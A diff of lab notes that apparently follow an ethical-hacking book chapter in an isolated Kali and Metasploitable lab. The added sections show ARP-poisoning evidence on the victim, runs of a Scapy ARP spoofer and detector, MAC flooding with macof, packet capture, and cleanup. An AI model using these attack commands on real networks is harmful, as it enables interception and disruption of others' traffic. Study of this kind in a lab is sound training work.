@@ -28,7 +28,7 @@ Expected result:
 1
 ```
 
-## 3. Start ARP Spoofing
+## 3. Start Manual ARP Spoofing
 
 From Kali terminal 1:
 
@@ -74,8 +74,6 @@ The HTTPS follow-up failed because Metasploitable is old and does not support th
 
 ## 6. Validate with tcpdump
 
-Because `urlsnarf` did not display the expected book output, `tcpdump` was used for validation:
-
 ```bash
 sudo tcpdump -i eth0 host 192.168.1.121 and port 80
 ```
@@ -85,4 +83,92 @@ Captured proof:
 ```text
 192.168.1.121 > OPNsense.internal.http
 HTTP: GET / HTTP/1.0
+```
+
+## 7. Inspect the Victim ARP Table
+
+On Metasploitable:
+
+```bash
+arp -a
+```
+
+Poisoned ARP table evidence:
+
+```text
+OPNsense.internal (192.168.1.1) at 08:00:27:8A:35:D2 [ether] on eth0
+? (192.168.1.188) at 08:00:27:8A:35:D2 [ether] on eth0
+```
+
+## 8. Run the Python Scapy ARP Spoofer
+
+From Kali:
+
+```bash
+cd ~/ethical-hacking/chapter-02
+sudo python3 arp_spoofer.py
+```
+
+## 9. Run the Python ARP Detector
+
+From Kali:
+
+```bash
+cd ~/ethical-hacking/chapter-02
+sudo python3 arpdetector.py
+```
+
+## 10. MAC Flooding with macof
+
+Confirm `macof` is installed:
+
+```bash
+which macof
+```
+
+Output:
+
+```text
+/usr/bin/macof
+```
+
+Start a capture showing Ethernet headers:
+
+```bash
+sudo tcpdump -i eth0 -e -n
+```
+
+Run a limited MAC flooding test:
+
+```bash
+sudo macof -i eth0 -n 50
+```
+
+Capture summary:
+
+```text
+492 packets captured
+492 packets received by filter
+0 packets dropped by kernel
+```
+
+## 11. Cleanup
+
+Stop running tools with:
+
+```text
+Ctrl+C
+```
+
+Turn IP forwarding back off:
+
+```bash
+echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
+cat /proc/sys/net/ipv4/ip_forward
+```
+
+Expected result:
+
+```text
+0
 ```
